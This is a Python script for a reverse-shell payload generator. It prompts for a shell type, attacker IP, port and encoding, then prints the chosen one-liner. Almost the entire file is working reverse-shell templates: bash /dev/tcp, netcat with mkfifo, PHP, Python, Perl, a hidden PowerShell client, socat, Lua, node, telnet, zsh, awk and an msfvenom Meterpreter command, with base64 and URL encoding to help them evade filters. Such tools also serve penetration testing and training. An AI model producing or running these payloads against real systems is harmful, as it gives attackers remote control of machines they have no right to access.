
from ast import For
import os
import base64
from time import sleep
from tkinter import N
import urllib.parse
import colorama
from colorama import Fore






#--------Vars-------#
shell_type = []
shell_type_encoded = []
ip = []
port = []
encode = []


#-----Code----#


print(Fore.GREEN +  """ 
██████╗░███████╗██╗░░░██╗███████╗██████╗░░██████╗░░░░░░░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░░░░░░░░██████╗░███████╗███╗░░██╗
██╔══██╗██╔════╝██║░░░██║██╔════╝██╔══██╗██╔════╝░░░░░░██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░░░░░░░██╔════╝░██╔════╝████╗░██║
██████╔╝█████╗░░╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░█████╗╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░█████╗██║░░██╗░█████╗░░██╔██╗██║
██╔══██╗██╔══╝░░░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗╚════╝░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░╚════╝██║░░╚██╗██╔══╝░░██║╚████║
██║░░██║███████╗░░╚██╔╝░░███████╗██║░░██║██████╔╝░░░░░░██████╔╝██║░░██║███████╗███████╗███████╗░░░░░░╚██████╔╝███████╗██║░╚███║
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░░░░░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝░░░░░░░╚═════╝░╚══════╝╚═╝░░╚══╝        """ +  Fore.RED + "By:EcasYT")

#sleep(3)


shell_type = int(input(Fore.BLACK + (""" 
#------Reverse shell type-----# 
1)Bash
2)Netcat 
3)PHP
4)Python
5)Perl
6)PowerShell
7)Ruby
8)Socat
9)Vlang
10)Java
11)JavaScript
12)Lua
13)node.js
14)Windows Meterpreter Reverse TCP
15)Telnet
16)zsh
17)Awk
---> """  )))

ip = input("""
IP --> """)

port = int(input("""
Port -->"""))


encode = int(input("""
#------Encode------#
0)No encoded
1)Base64
2)UrlEncode
---> """))


if shell_type == 1:
    shell_type = ("bash -i >& /dev/tcp/%s/%s 0>&1"%(ip,port))
elif shell_type == 2:
    shell_type = ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f"%(ip,port))
elif shell_type == 3:
    shell_type = ("php -r '$sock=fsockopen(\"%s\",%s);exec(\"sh <&3 >&3 2>&3\");'"%(ip,port))
elif shell_type == 4:
    shell_type = ("export RHOST=\"%s\";export RPORT=%s;python -c \'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")\'"%(ip,port))
elif shell_type == 5:
    shell_type = ("perl -e \'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};\'"%(ip,port))
elif shell_type == 6:
    shell_type = ("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"%(ip,port))
elif shell_type == 7:
    shell_type = ("ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%s))\'"%(ip,port))
elif shell_type == 8:
    shell_type = ("socat TCP:%s:%s EXEC:sh"%(ip,port))
elif shell_type == 9:
    shell_type = ("echo \'import os\' > /tmp/t.v && echo \'fn main() { os.system(\"nc -e sh %s %s 0>&1\") }\' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"%(ip,port))
elif shell_type == 10:
    shell_type = ("""public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/%s/%s 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"""%(ip,port))
elif shell_type == 11:
    shell_type = ("""String command = "var host = '%s';" +
                       "var port = %s;" +
                       "var cmd = 'sh';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);"""%(ip,port))
elif shell_type == 12:
    shell_type = ("lua -e \"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'%s\',\'%s\');os.execute(\'sh -i <&3 >&3 2>&3\');\""%(ip,port))
elif shell_type == 13:
    shell_type = ("require(\'child_process\').exec(\'nc -e sh %s %s\')"%(ip,port))
elif shell_type == 14:
    shell_type = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o reverse.exe"%(ip,port))
elif shell_type == 15:
    shell_type = ("TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | sh 1>$TF"%(ip,port))
elif shell_type == 16:
    shell_type = ("zsh -c 'zmodload zsh/net/tcp && ztcp %s %s && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"%(ip,port))
elif shell_type == 17:
    shell_type = ("awk \'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null"%(ip,port))





if encode == 1:
    shell_type_encoded = base64.urlsafe_b64encode(shell_type.encode("utf-8"))
    shell_type_encoded = str(shell_type_encoded, "utf-8")
elif encode == 2:
    shell_type_encoded = urllib.parse.quote(shell_type)

    



print(Fore.BLACK +  "Reverse shell ---> " + Fore.RED  + shell_type)



print(Fore.BLACK + "\nReverse shell encoded --->" + Fore.RED + shell_type_encoded)
 

